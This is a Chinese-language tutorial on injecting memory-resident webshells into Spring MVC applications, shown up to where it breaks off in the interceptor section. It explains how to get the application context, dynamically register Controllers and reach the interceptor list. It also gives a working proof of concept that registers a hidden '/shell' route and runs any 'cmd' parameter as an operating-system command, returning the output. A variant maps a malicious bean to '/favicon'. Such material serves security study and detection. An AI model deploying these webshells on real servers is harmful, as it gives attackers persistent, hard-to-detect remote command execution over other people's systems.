# 1 Spring 特性
## 0x01 综述
简化来说就是 IOC 和 AOP，中文翻译是控制反转和切面编程。我个人理解：IOC 是把 java 类托管，我们就不需要自己主动去 new 一个类了，按需向 IOC 容器中取就行；AOP 其实我个人感觉很像 JavaAgent，只不过 Spring 实现起来比较简单，写一个配置类和对应的配置文件即可精确定位方法，实现方法执行前，中，后插入代码执行


## 0x02 Spring 以及 SprinMVC
我们由 Spring 特性提取出一段信息：Spring 中的对象都是托管给 IOC 容器去管理的，不论是获取，删除等操作，都是由 IOC 容器去做的
至于 Spring 或者 springboot 的一个小 demo，师傅们可以移步至其他基础部分，这里就不多阐述
然后必须提的一点是 SpringMVC 的流程，我这里有一张图，然后辅助一些文字描述：

- 首先 `DispatchServlet` 接收到客户端发送过来的请求信息（tomcat 已经处理完信息了，由单独的 servlet 接收），然后 `DispatchServlet`去调用 HandlerMapping，其主要目的是去完成对应 Controller 的搜索
- 找到 Controller 后自然是去执行 Controller 的逻辑，Controller 的逻辑依赖于调用业务逻辑执行，也就是对 Mapper 层的 CRUD 操作，然后 Controller 会将这些处理完之后的数据打包，发送给 `ModelAndView` 去渲染
- `ModelAndView`渲染完毕，发送给 `DispatchServlet`，让他去处理对应的前端渲染相关工作
- 最后`DispatchServlet`终于返回到了前端，也就是用户看到的数据

![](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709431796433-fc555bfe-d4fa-4203-a47e-aaa6492e306e.png#averageHue=%23f9f9f9&from=url&id=q9Asb&originHeight=567&originWidth=1091&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
所以 SpringMVC 的核心点就是 `DispatchServlet`，它起到了一个中轴的作用，之后的分析会着重于它


## 0x03 IOC 容器
Spring 中 IOC 的中文翻译：**控制反转**，我个人理解为，程序员不用再去过多的处理类的创建和配置，专心于控制逻辑的设计，到需要用到 java 对象时再从容器中取出就行
Spring 框架中` BeanFactory`接口就是 `spring` IOC 容器的实际代表者，但是 一个 IOC 不可能只单单有这些功能，还需要获取 sources 资源，以及字符转化等功能，所以最终 `ApplicationContext` 就来继承一些必要的接口（`BeanFactory` 肯定包含在内），作为 IOC 容器

![图片-55.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709725402899-cda2d1c4-e64f-40aa-a355-8f295de97b65.png#averageHue=%232d2d2d&clientId=u6003de45-a3b1-4&from=paste&height=174&id=ua241b277&originHeight=261&originWidth=1509&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30665&status=done&style=none&taskId=u2bd84fd0-f00c-409a-91d1-395959d52c4&title=&width=1006)
每一个 dispatchservlet 都代表着一段完整的逻辑链，我们在学习的时候一般都是一个 web 程序有一个 dispatchservlet，而一个 dispatchservlet 的创建就代表着一个 `child context`型的 IOC 容器被创建了，有 child 必有 Root（not father），Spring 中的 `Root Context`是伴随着 ContextLoaderListener 创建的，这也是全局唯一一个公共的 IOC 容器
前面也提到了，IOC 容器的代表者是 `ApplicationContext`，当然这个 child 的 IOC 容器。
Root 的 IOC 容器叫做 `WebApplicationContext`，所有的 child 可以取访问 Root 容器，但是 Root 却不能去访问 Child 中的内容
随着每一个 Context 被创建，都会被最为属性存入 Tomcat 中的 `ServletContext`

讲了这么多，其实是为了解决动态注册 Controller 等 Spring 中常用且可用组件注册的问题，也就引出了我们如何注入 Spring 型内存马的整体思路：

- 获取到上下文环境内容
- 注册恶意组件
- 配置路径映射
# 2 Controller 型内存马
## 0x01 为什么是 Controller？
刚开始学内存马的 filter，listener，servlet 等类型的最直观的体现：我们通过某个特定的路由去访问内存马，都是作用于路由，我们客户端能够访问到，而 Spring 中最直观的路由逻辑的体现就是 Controller 了


## 0x02 实现分析
### 1x01 获取到上下文内容
#### 总计四种方法 
#### 1 `ContextLoaderListener`
这种方法是获取的当前 `ContextLoaderListener`创建的 Root `WebApplicationContext`
```java
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

##### 2  WebApplicationContextUtils
这个工具类的`getWebApplicationContext` 方法也是获取的 `ContextLoaderListener` 创建的 `Root WebApplicationContext `
```java
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```
其实这个类的 ` getRequiredWebApplicationContext`也能够获取到 `RootContext`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709730801343-a2937304-ff50-4dfd-bb03-c40c99d8cfcd.png#averageHue=%233c4650&clientId=u6003de45-a3b1-4&from=paste&height=69&id=u1f70e752&originHeight=104&originWidth=891&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=73439&status=done&style=none&taskId=ufeace79f-7c8a-4f3d-80f0-7cb9412aecd&title=&width=594)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709730846358-28cf3358-c44f-4c30-b887-984f97aa1050.png#averageHue=%233c424c&clientId=u6003de45-a3b1-4&from=paste&height=244&id=u06599f56&originHeight=366&originWidth=1928&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=286665&status=done&style=none&taskId=u8dd35f0d-9348-4c81-b36f-fe9e76a41d2&title=&width=1285.3333333333333)

多讲一嘴这个 `getWebApplicationContext`方法是如何获取到 Root Context 的：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709730979937-a3b154b2-e4b1-4075-9589-ce6dfbafec94.png#averageHue=%233c424b&clientId=u6003de45-a3b1-4&from=paste&height=514&id=ude405a52&originHeight=771&originWidth=1835&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=650512&status=done&style=none&taskId=u8a810bed-9e16-40be-ab42-85487ea234e&title=&width=1223.3333333333333)
它其实是从 Servlet 中直接通过键值对取出的 RootContext
在这个 Utils 获取 WAC 的整体的逻辑中，最终都是调用到了 `getWebApplicationContext`来获取


##### 3 RequestContextUtils
```java
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```
这个类的 `getWebApplicationContext`方法现在改成了 `findWebApplicationContext`方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709731151448-e7a90656-391c-4769-b991-2fade9fca53f.png#averageHue=%233c434c&clientId=u6003de45-a3b1-4&from=paste&height=410&id=ucb7e4fb4&originHeight=615&originWidth=2100&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=547031&status=done&style=none&taskId=u1c72435c-2439-4492-ac4a-d5d44f97eae&title=&width=1400)
##### 4 getAttribute
```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```
这个是从 ServletContext 中获取

### 1x02 动态注册 Controller
#### 2x01 如何获取到映射注册器
回顾 MVC 的控制流程，接受到客户端发送的信息之后，调用 `HandlerMapping`去找对应的 Controller 处理逻辑。这里的 `HandlerMapping`其实指的是 `RequestMappingHandlerMapping`
`RequestMappingHandlerMapping`是 Spring 中一个十分重要的 bean，Spring 会先把 Controller 解析成`RequestMappingInfo`对象，然后再注册进`RequestMappingHandlerMapping`中，这样请求才能够从 `RequestMappingHandlerMapping`中找到对应的 Controller
那么现在的目标是如何获取到`RequestMappingHandlerMapping`并向`RequestMappingHandlerMapping`中注册 Controller 
一个一个解决问题：

1. 获取 `RequestMappingHandlerMapping`本身并不难，Spring 对于这么重要类当然是自己事先就注册好了的，存放于 IOC 容器中，所以我们只需要获取上下文，然后通过取键值对得到---->而一个 web 程序来说，肯定会有一个 dispatchservlet 以及它创建的 `ApplicationContext`，还有一个`ContextLoaderListener`创建的 `WebApplicationContext`,并且在`dispatchservlet` 创建的过程中就已经把 `RequestMappingHandlerMapping`注册好，装进其 IOC 容器了
2. 通过 `dispatchservlet`的 IOC 容器获取到 `RequestMappingHandlerMapping`之后就是注册了映射路由了  但是请注意： Spring 2.5 开始到 Spring 3.1 之前一般使用
`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`
映射器 ；   Spring 3.1 开始及以后一般开始使用新的  `org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping` 映射器来支持@Contoller和@RequestMapping注解。  

##### 针对于  RequestMappingHandlerMapping 映射器的获取和注册
整理一下通过`RequestMappingHandlerMapping`的父类 `Abstract**HandlerMethod**Mapping`注册实现的伪代码：
```java
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean

RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);

// 2. 通过反射获得自定义 controller 中唯一的 Method 对象

Method method = (Class.forName("evilMethod").getDeclaredMethods())[0];

// 3. 定义访问 controller 的 URL 地址

PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");

// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）

RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();

// 5. 在内存中动态注册 controller

RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```

在其父类 `Abstract**HandlerMethod**Mapping`中其实还有一个方法可以用来注册路由映射--`detectHandlerMethods`

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709737009610-7cb402ad-17a3-4c15-b4c3-d6ae2323fcb7.png#averageHue=%233d434c&clientId=u9af1806a-7a9b-4&from=paste&height=670&id=u04bf8f66&originHeight=1005&originWidth=1745&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=816298&status=done&style=none&taskId=ue9804de3-6f8b-4779-a568-9bc8f6e5ce6&title=&width=1163.3333333333333)
逻辑为接受一个任意类型的 handler 参数，然后在 IOC 容器中找寻这个名字 bean 进行注册		
贴一下实现的伪代码：
```java
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("恶意Controller").newInstance());

org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);

java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);

m1.setAccessible(true);

m1.invoke(requestMappingHandlerMapping, "dynamicController");
```


针对于 DefaultAnnotationHandlerMapping 的注册映射
对于 Spring 2.5 开始到 Spring 3.1  的`DefaultAnnotationHandlerMapping`映射注册（不会现在还有人在用吧），我们可以跟踪到它的顶级父类 `AbstractUrlHandlerMapping`，其中有这么一段方法
```java
	protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException {
		Assert.notNull(urlPath, "URL path must not be null");
		Assert.notNull(handler, "Handler object must not be null");
		Object resolvedHandler = handler;

		// Eagerly resolve handler if referencing singleton via name.
		if (!this.lazyInitHandlers && handler instanceof String) {
			String handlerName = (String) handler;
			ApplicationContext applicationContext = obtainApplicationContext();
			if (applicationContext.isSingleton(handlerName)) {
				resolvedHandler = applicationContext.getBean(handlerName);
			}
		}

		Object mappedHandler = this.handlerMap.get(urlPath);
		if (mappedHandler != null) {
			if (mappedHandler != resolvedHandler) {
				throw new IllegalStateException(
						"Cannot map " + getHandlerDescription(handler) + " to URL path [" + urlPath +
						"]: There is already " + getHandlerDescription(mappedHandler) + " mapped.");
			}
		}
		else {
			if (urlPath.equals("/")) {
				if (logger.isTraceEnabled()) {
					logger.trace("Root mapping to " + getHandlerDescription(handler));
				}
				setRootHandler(resolvedHandler);
			}
			else if (urlPath.equals("/*")) {
				if (logger.isTraceEnabled()) {
					logger.trace("Default mapping to " + getHandlerDescription(handler));
				}
				setDefaultHandler(resolvedHandler);
			}
			else {
				this.handlerMap.put(urlPath, resolvedHandler);
				if (logger.isTraceEnabled()) {
					logger.trace("Mapped [" + urlPath + "] onto " + getHandlerDescription(handler));
				}
			}
		}
	}
```
我们通过传入 URL 路由 和恶意 bean 即可
实现伪代码如下：
```java
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

## 0x03 最终实现 POC
这里的话我们演示能够适配版本更新的 `RequestMappingHandlerMapping`及其 registerMapping 方法进行注册
```java
package com.stoocea.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

@Controller
public class EvilController {

        @RequestMapping("/Evil")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        System.out.println("i am in");
        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{
        public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }
    }
}
```
这里我的版本是 tomcat8   JDK11 然后 spring 版本的是 5，可以复现
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709738213835-98ccdbf1-7cf5-4adf-aeaf-39a29fc85250.png#averageHue=%236d9824&clientId=u9af1806a-7a9b-4&from=paste&height=124&id=ucd52ff9e&originHeight=205&originWidth=2559&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=40796&status=done&style=none&taskId=u908d4aee-1d00-4003-9e9b-ccaebf67e2b&title=&width=1550.9090012689649)

如果师傅们出不来结果，考虑如下几个方面的环境配置
springmvc 中的配置是否完整，也即是否扫描了识别了 controller，和是否配置了 springmvc 的注解引擎
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:context="http://www.springframework.org/schema/context"
  xmlns:mvc="http://www.springframework.org/schema/mvc"
  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd">


  <!--    解决中文乱码问题的一键式-->
  <mvc:annotation-driven>
    <mvc:message-converters register-defaults="true">
      <bean class="org.springframework.http.converter.StringHttpMessageConverter">
        <property name="supportedMediaTypes">
          <list>
            <value>text/html;charset=UTF-8</value>
            <value>application/json;charset=UTF-8</value>
            <value>text/plain;charset=UTF-8</value>
            <value>application/xml;charset=UTF-8</value>
          </list>
        </property>
      </bean>
    </mvc:message-converters>
  </mvc:annotation-driven>


  <!--扫描含有注解的controller-->
  <context:component-scan base-package="com.stoocea.Controller"/>

  <!--    静态资源过滤器-->
  <mvc:default-servlet-handler />

  <!--    SpringMVC的注解引擎-->
  <mvc:annotation-driven />

  <!--    添加视图解析器-->
  <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver" id="internalResourceViewResolver">
    <!--        前缀-->
    <property name="prefix" value="/WEB-INF/jsp/"/>
    <!--        后缀-->
    <property name="suffix" value=".jsp"/>
  </bean>
  <!--    Handler-->

</beans>
```

web.xml 中是否准备好了 dispatchservlet 的环境准备
```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

  <servlet>
    <servlet-name>springmvc</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
      <param-name>contextConfigLocation</param-name>
      <param-value>classpath:springmvc-servlet.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>

  <servlet-mapping>
    <servlet-name>springmvc</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>
</web-app>
```


# 3 interceptor 型内存马
## 0x01 什么是 interceptor
类比 Tomcat 中的 filter，主要作用是用来拦截用户的请求并做相应的处理，通常就是实现鉴权和记录日志等作用
springmvc 中要想实现 interceptor 自定义并不难，可以通过如下两个方式实现：

1. 通过实现 `HandlerInterceptor` 接口或者继承 `HandlerInterceptor` 接口的实现类（比如` HandlerInterceptorAdapter`）
2. 通过实现` WebRequestInterceptor  `或者继承 ` WebRequestInterceptor`接口的实现类

现在来尝试实现一个 Interceptor，采用的方法是直接实现`HandlerInterceptor`接口，`HandlerInterceptor`接口本身就有三个方法’

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709778858494-b85ebdf6-88bf-4b7c-94c1-d9dccc7d1ae2.png#averageHue=%233c454f&clientId=u1acac59a-b2bd-4&from=paste&height=113&id=udaf047ac&originHeight=187&originWidth=787&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=82905&status=done&style=none&taskId=u742da094-486d-4f93-a371-f2650039753&title=&width=476.9696694015925)

- preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。
- postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
- afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。

首先先写一个 interceptor
```java
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class TestInterceptor  implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String url = request.getRequestURI();
        PrintWriter writer = response.getWriter();

        if (url.indexof("/login")>=0){
            writer.write("loginSuccess");
            writer.flush();
            writer.close();
            return true;
        }
        writer.write("LoginFirst");
        writer.flush();
        writer.close();
        return false;

    }
}
```
然后在 webmvc 中去注册这个 interceptor
```java
    <mvc:interceptors>

        <mvc:interceptor>

            <mvc:mapping path="/*"/>

            <bean class="com.stoocea.Interceptor.TestInterceptor"/>

        </mvc:interceptor>

    </mvc:interceptors>
```
然后可以写 两个controller 实验一下
```java
package com.stoocea.Controller;


import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class HelloController  {

        @RequestMapping("/hello")
        public String hello(Model model){
                model.addAttribute("msg","success MVC");
                return "hello";

        }

        @GetMapping("/login")
        @ResponseBody
        public String login(Model model){
                model.addAttribute("msg","success");
                return "testlogin";
        }
}
```

当我们访问 hello 路由时
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709780409533-fbcc9074-73cc-4444-968c-f59833f0114c.png#averageHue=%239db2b4&clientId=u1acac59a-b2bd-4&from=paste&height=137&id=u9ce7f38b&originHeight=226&originWidth=908&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16222&status=done&style=none&taskId=u3a8ce0ab-9d59-4cf4-8adf-ca3f53aae1d&title=&width=550.3029984963736)
会发现直接被拦截器阻断，返回 loginfirst 字符串
但如果我们访问 login 路由
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709780435038-6e559d7d-71d6-44ca-834b-908a049a9b21.png#averageHue=%23abcfbe&clientId=u1acac59a-b2bd-4&from=paste&height=132&id=ud2168b84&originHeight=218&originWidth=730&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=15075&status=done&style=none&taskId=ub6b966fc-146d-4f84-87f8-0b37fa1190c&title=&width=442.42421685281136)
成功执行了 interceptor 的逻辑，但是 controller 的逻辑并没有执行，这是因为拦截器在接受到请求数据，并且执行完 handler 的逻辑之后，已经把结果写入 response 进行返回了，dispatchservlet 会假定拦截器本身已经处理完毕请求，不会再去执行后续的 controller 逻辑,所以我们之后 controller 该返回的 logintest 字符串就没出来

## 0x02 interceptor 的调用流程
在 interceptor 的执行内容中下一个断点
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709790892112-c1e7eec8-e2f9-4588-bd2f-8a8677ed3be2.png#averageHue=%233f4850&clientId=u1acac59a-b2bd-4&from=paste&height=95&id=u314b2d34&originHeight=157&originWidth=1854&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=144980&status=done&style=none&taskId=u075464a1-f431-4da0-bf8c-566ec828359&title=&width=1123.6362986919346)
然后访问 login 路由查看调用栈，会发现其实还是 filter 先执行，然后经过 dispatchservlet 之后才会被分配到执行 interceptor 的内容
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709790663320-723fd81d-465f-4d97-ae2a-30e9f32611dc.png#averageHue=%235c5d56&clientId=u1acac59a-b2bd-4&from=paste&height=341&id=uea7fae2e&originHeight=562&originWidth=978&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=385497&status=done&style=none&taskId=ua80287f3-3830-4c32-a1a1-a63067efa8e&title=&width=592.7272384685609)
前面的内容就不探究了，我们到 disaptchservlet 的 dodispatch 方法
走到如下图的 `getHandler`处
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709791713535-eeceaff7-5038-4abd-bf6c-bd8ebca0d451.png#averageHue=%233d444d&clientId=u1acac59a-b2bd-4&from=paste&height=169&id=ubc6c43bf&originHeight=279&originWidth=1684&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=181274&status=done&style=none&taskId=ubc46d74c-c953-43cb-8101-0ec4b4f03f8&title=&width=1020.6060016166224)
然后继续跟进到 getHandler 方法的具体内容
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709791762674-68facd33-9e14-4773-a34c-5491920a42c0.png#averageHue=%233c444c&clientId=u1acac59a-b2bd-4&from=paste&height=268&id=udc3cdaab&originHeight=443&originWidth=2021&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=351859&status=done&style=none&taskId=u671e5ee4-b732-42bd-835b-eb1b2f45984&title=&width=1224.8484140541532)
最终还是调用到了 `AbstractHandlerMapping` 的 `getHandler` 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709791806939-9fa78dc7-b398-42fa-8eba-cdf7c4ef0c2c.png#averageHue=%233c444c&clientId=u1acac59a-b2bd-4&from=paste&height=355&id=u98f48aa9&originHeight=585&originWidth=2115&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=487622&status=done&style=none&taskId=u25f68e83-0c81-46e2-9e17-564e8f70e48&title=&width=1281.8181077310905)
继续跟进到 `getHandlerExecutionChain`
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792130230-17f71eeb-ea1f-406d-ad79-df04267153f9.png#averageHue=%233e464f&clientId=u8df47c52-911f-4&from=paste&height=238&id=u1fd700f2&originHeight=393&originWidth=1892&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=409825&status=done&style=none&taskId=u72ba2991-98e8-4246-a17d-1a795cfe3fd&title=&width=1146.666600391122)
这里的逻辑是最终返回一串 HandlerChain，但是一开始进入方法的时候，HandlerChain 是为空的，我们需要从`adaptedInterceptors`中循环遍历获取 interceptor，add 到 chain 中，这里默认存在几个自带的 interceptor，最后才会加入我们自己写的 interceptor
跟进 addInterceptor
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792123167-8bee5670-3b3c-40ec-a58e-3c347197d085.png#averageHue=%233b424b&clientId=u8df47c52-911f-4&from=paste&height=261&id=u432d23d2&originHeight=431&originWidth=1894&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=440111&status=done&style=none&taskId=u327ca40e-fc8f-4aa4-b297-b3d88b0271b&title=&width=1147.8787215331845)
直接就调用 add 方法添加了，没有任何过滤
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792436021-c419ccdd-699e-43e5-8936-92ee30dc4561.png#averageHue=%233e444c&clientId=u8df47c52-911f-4&from=paste&height=113&id=u8994262f&originHeight=187&originWidth=1645&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=117630&status=done&style=none&taskId=u10f62dc4-7e54-47ac-978f-e4d5ddb22e3&title=&width=996.9696393464037)
最后直接返回刚才通过循环遍历添加的 interceptor 列表，其中就包括我们写的测试 interceptor
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792493882-7ea5a72f-8e6c-453c-a541-f8f8870174dd.png#averageHue=%233c434b&clientId=u8df47c52-911f-4&from=paste&height=533&id=u8f5a6319&originHeight=879&originWidth=1860&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=883435&status=done&style=none&taskId=u2bb7dc75-d819-49fc-8bea-1fa9cfd0ea9&title=&width=1127.272662118122)

返回到 dispatch 的逻辑，来到 applyPreHandle 方法，他这里就开始调用每一个 interceptor 的 preHandle 方法了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792650364-ea907d18-95b6-410b-b03c-b243706de5d6.png#averageHue=%233e444c&clientId=u8df47c52-911f-4&from=paste&height=105&id=uf1d884bf&originHeight=174&originWidth=1761&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=100259&status=done&style=none&taskId=u1dd5ba29-cc6b-4e0e-bca7-4a10b7fa258&title=&width=1067.2726655860286)
直到这里就是整个 interceptor 从获取到调用 prehandle 的流程，其实做完整个 prehandle 就是直接开始调用 handle 到 controller 处理逻辑了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792780416-1aca7c8b-3079-4531-bb4e-cd380d893af1.png#averageHue=%233e444c&clientId=u8df47c52-911f-4&from=paste&height=86&id=u69fbac18&originHeight=142&originWidth=1127&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=63852&status=done&style=none&taskId=udb9cefcd-bf9d-417a-94ce-566447fd9e1&title=&width=683.030263552217)
根据刚才调用栈和流程分析不难看出，其实 spring 这一层是要优先级低于 tomcat 的，因为毕竟其核心分配器`dispatchServlet`也属于是 servlet，肯定要执行的比 filter 
整合一下大概的流程
```java
HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Controller
```

## 0x03 interceptor 内存马的实现流程
上面的流程分析其实只是在走 interceptor 被注册完之后走的流程，也就是 interceptor 如何执行的，我们注入 interceptor 内存马就必须直到 interceptor 如何先注册到 `adaptedInterceptors`中
既然是 Spring 型，那所有的想取到的类我们都能通过 IOC 容器去取，这里首先要明确目标，我们要找的是谁？---->根据刚才的流程分析，我们刚才添加的每一个 interceptor 都是从`adaptedInterceptors`属性值中取的，所以我们待会要获取的就是 `adaptedInterceptors`的所属对象---`AbstractHandlerMapping`

### 1x01 获取`AbstractHandlerMapping`
这里前提是已经了解过上面所述的 4 种获取上下文 context 的方法了，我们还学习一种新的获取的方法--- 通过反射获取`LiveBeansView`类  的 applicationContext 来获取，当然其他四种方法也是可以的
```java
//通过LiveBeansView获取WebContext
Field field=Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
field.setAccessible(true);
WebApplicationContext applicationContext=(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();
```

然后就是根据 IOC 容器得到 `AbstractHandlerMapping`
```java
//通过IOC容器get到AbstractHandlerMapping
AbstractHandlerMapping handlerMapping=applicationContext.getBean("requestMappingHandlerMapping", AbstractHandlerMapping.class);
```

### 1x02 动态注册 interceptor
```java
Field field1=AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
field1.setAccessible(true);
